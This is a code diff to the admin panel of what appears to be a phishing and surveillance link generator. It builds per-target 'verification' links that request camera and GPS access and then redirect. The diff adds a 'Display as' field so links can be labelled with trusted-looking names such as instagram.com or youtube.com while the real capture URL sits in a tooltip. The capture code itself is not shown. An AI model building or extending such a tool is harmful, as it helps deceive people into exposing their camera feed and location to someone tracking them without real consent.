@@ -367,6 +367,8 @@
         <input type="text" id="editLinkName" placeholder="e.g. Target Name">
         <label>Redirect URL (after verification)</label>
         <input type="url" id="editRedirect" placeholder="https://example.com">
+        <label>Display as (optional — anchor text shown in tables)</label>
+        <input type="text" id="editDisplayUrl" placeholder="e.g. https://instagram.com">
         <label>Permissions</label>
         <div class="perm-row">
             <label class="check-label"><input type="checkbox" id="editCam"> 📷 Camera</label>
@@ -616,6 +618,9 @@
                         <input type="url"  id="linkRedirect" placeholder="Redirect URL (optional)"   style="flex:1;min-width:180px;">
                     </div>
                     <div class="form-row">
+                        <input type="text" id="linkDisplay"  placeholder="Display as (optional, e.g. https://instagram.com)" style="flex:1;min-width:260px;">
+                    </div>
+                    <div class="form-row">
                         <label class="check-label"><input type="checkbox" id="checkCam" checked> 📷 Camera</label>
                         <label class="check-label"><input type="checkbox" id="checkGPS" checked> 📍 GPS</label>
                         <button class="btn btn-primary" id="createBtn">⚡ Generate Link</button>
@@ -853,6 +858,9 @@
                     <div class="form-row">
                         <input type="text" id="uLinkName"     placeholder="Target Name" style="width:200px;">
                         <input type="url"  id="uLinkRedirect" placeholder="Redirect URL (optional)" style="flex:1;min-width:180px;">
+                    </div>
+                    <div class="form-row">
+                        <input type="text" id="uLinkDisplay"  placeholder="Display as (optional, e.g. https://youtube.com)" style="flex:1;min-width:260px;">
                     </div>
                     <div class="form-row">
                         <label class="check-label"><input type="checkbox" id="uCheckCam" checked> 📷 Camera</label>
@@ -1262,8 +1270,11 @@ function renderLinksTable() {
         if (false) {
             // (user-link branch kept for structure, never reached)
         } else {
+            const verHref = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
+            const display = l.displayUrl ? esc(l.displayUrl) : `<span style="color:var(--text);">${esc(l.name)}</span>`;
+            const tooltip = l.displayUrl ? ` title="Actual link: ${verHref}"` : '';
             const redir = l.redirectUrl ? `<a href="${esc(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:11px;">${esc(l.redirectUrl.slice(0,28))}…</a>` : '<span style="color:#475569;">—</span>';
-            nameCell = `<td><b>${esc(l.name)}</b></td>`;
+            nameCell = `<td><a href="${verHref}" target="_blank" rel="noopener"${tooltip} style="color:var(--primary);font-weight:700;text-decoration:none;">${display}</a></td>`;
             permCell = `<td style="font-size:11px;">
                 ${l.cam ? '<span class="tag">📷 CAM</span>' : ''}
                 ${l.gps ? '<span class="tag">📍 GPS</span>' : ''}
@@ -1313,10 +1324,11 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
         const l = allLinksData?.[id];
         if (!l) return;
         currentEditId = id;
-        document.getElementById('editLinkName').value  = l.name || '';
-        document.getElementById('editRedirect').value  = l.redirectUrl || '';
-        document.getElementById('editCam').checked     = !!l.cam;
-        document.getElementById('editGPS').checked     = !!l.gps;
+        document.getElementById('editLinkName').value    = l.name || '';
+        document.getElementById('editRedirect').value    = l.redirectUrl || '';
+        document.getElementById('editDisplayUrl').value  = l.displayUrl || '';
+        document.getElementById('editCam').checked       = !!l.cam;
+        document.getElementById('editGPS').checked       = !!l.gps;
         document.getElementById('editLinkModal').classList.add('open');
     } else if (action === 'delete') {
         if (!confirm('Move this link to Recycle Bin?')) return;
@@ -1333,17 +1345,20 @@ document.getElementById('createBtn').onclick = () => {
     const name = document.getElementById('linkName').value.trim() || 'Unnamed';
     const id   = 'LNK-' + Math.random().toString(36).substr(2, 9).toUpperCase();
     const ru   = document.getElementById('linkRedirect').value.trim();
+    const du   = document.getElementById('linkDisplay').value.trim() || null;
     set(ref(db, 'managed_links/' + id), {
         id, name, active: true, visits: 0,
         cam: document.getElementById('checkCam').checked,
         gps: document.getElementById('checkGPS').checked,
         redirectUrl: ru || '',
+        displayUrl:  du,
         createdAt:   Date.now(),
         _ownerType:  'admin',
         _ownerId:    'admin'
     });
-    document.getElementById('linkName').value = '';
+    document.getElementById('linkName').value    = '';
     document.getElementById('linkRedirect').value = '';
+    document.getElementById('linkDisplay').value  = '';
     toast('✅ Link created: ' + name, 'var(--green)');
 };
 
@@ -2012,6 +2027,9 @@ async function showUserActivity(username) {
 
     // ── link row for table
     const linkRow = ([id, l]) => {
+        const verHref = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
+        const actDisplay = l.displayUrl ? ex(l.displayUrl) : ex(l.name||'Unnamed');
+        const actTooltip = l.displayUrl ? ` title="Actual link: ${verHref}"` : '';
         const status = l.active
             ? `<span style="color:var(--green);font-weight:700;font-size:11px;">● Active</span>`
             : `<span style="color:var(--red);font-weight:700;font-size:11px;">● Off</span>`;
@@ -2021,7 +2039,7 @@ async function showUserActivity(username) {
             : '<span style="color:#475569;font-size:10.5px;">—</span>';
         return `
         <tr>
-            <td style="padding:8px 10px;font-weight:600;font-size:12px;color:var(--text);">${ex(l.name||'Unnamed')}</td>
+            <td style="padding:8px 10px;font-weight:600;font-size:12px;color:var(--text);"><a href="${verHref}" target="_blank" rel="noopener"${actTooltip} style="color:var(--primary);font-weight:700;text-decoration:none;">${actDisplay}</a></td>
             <td style="padding:8px 10px;font-size:11px;color:var(--muted);">${perms}</td>
             <td style="padding:8px 10px;">${redir}</td>
             <td style="padding:8px 10px;">${status}</td>
@@ -2207,9 +2225,12 @@ function renderUserLinksTable() {
         if (search && !(l.name || '').toLowerCase().includes(search)) return;
         count++;
         const row = document.createElement('tr');
+        const verHref = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
+        const uDisplay = l.displayUrl ? esc(l.displayUrl) : `<span style="color:var(--text);">${esc(l.name)}</span>`;
+        const uTooltip = l.displayUrl ? ` title="Actual link: ${verHref}"` : '';
         const redir = l.redirectUrl ? `<a href="${esc(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:11px;">${esc(l.redirectUrl.slice(0,28))}…</a>` : '<span style="color:#475569;">—</span>';
         row.innerHTML = `
-            <td><b>${esc(l.name)}</b></td>
+            <td><a href="${verHref}" target="_blank" rel="noopener"${uTooltip} style="color:var(--primary);font-weight:700;text-decoration:none;">${uDisplay}</a></td>
             <td>${l.cam ? '<span class="tag">📷 CAM</span>' : ''}${l.gps ? '<span class="tag">📍 GPS</span>' : ''}</td>
             <td>${redir}</td>
             <td class="${l.active ? 'status-active' : 'status-inactive'}">${l.active ? '● ACTIVE' : '● OFF'}</td>
@@ -2248,10 +2269,11 @@ document.getElementById('uLinkTableBody').addEventListener('click', e => {
         const l = uAllLinksData?.[id];
         if (!l) return;
         currentEditId = id;
-        document.getElementById('editLinkName').value = l.name || '';
-        document.getElementById('editRedirect').value = l.redirectUrl || '';
-        document.getElementById('editCam').checked    = !!l.cam;
-        document.getElementById('editGPS').checked    = !!l.gps;
+        document.getElementById('editLinkName').value   = l.name || '';
+        document.getElementById('editRedirect').value   = l.redirectUrl || '';
+        document.getElementById('editDisplayUrl').value = l.displayUrl || '';
+        document.getElementById('editCam').checked      = !!l.cam;
+        document.getElementById('editGPS').checked      = !!l.gps;
         document.getElementById('editLinkModal').classList.add('open');
     } else if (uaction === 'delete') {
         if (!confirm('Move this link to Recycle Bin?')) return;
@@ -2268,17 +2290,20 @@ document.getElementById('uCreateBtn').onclick = () => {
     const name = document.getElementById('uLinkName').value.trim() || 'Unnamed';
     const id   = 'LNK-' + Math.random().toString(36).substr(2, 9).toUpperCase();
     const ru   = document.getElementById('uLinkRedirect').value.trim();
+    const du   = document.getElementById('uLinkDisplay').value.trim() || null;
     set(ref(db, 'managed_links/' + id), {
         id, name, active: true, visits: 0,
         cam: document.getElementById('uCheckCam').checked,
         gps: document.getElementById('uCheckGPS').checked,
         redirectUrl: ru || '',
+        displayUrl:  du,
         createdAt:   Date.now(),
         _ownerType:  'user',
         _ownerId:    currentSession.username
     });
-    document.getElementById('uLinkName').value    = '';
+    document.getElementById('uLinkName').value     = '';
     document.getElementById('uLinkRedirect').value = '';
+    document.getElementById('uLinkDisplay').value  = '';
     toast('✅ Link created: ' + name, 'var(--green)');
 };
 
@@ -2781,10 +2806,12 @@ document.getElementById('saveEditLink').onclick = () => {
     const l  = allLinksData?.[currentEditId] || uAllLinksData?.[currentEditId];
     const nm = document.getElementById('editLinkName').value.trim() || (l?.name || 'Unnamed');
     const ru = document.getElementById('editRedirect').value.trim();
+    const du = document.getElementById('editDisplayUrl').value.trim() || null;
     update(ref(db, 'managed_links/' + currentEditId), {
         name: nm, redirectUrl: ru,
         cam: document.getElementById('editCam').checked,
-        gps: document.getElementById('editGPS').checked
+        gps: document.getElementById('editGPS').checked,
+        displayUrl: du
     }).then(() => {
         document.getElementById('editLinkModal').classList.remove('open');
         currentEditId = null;
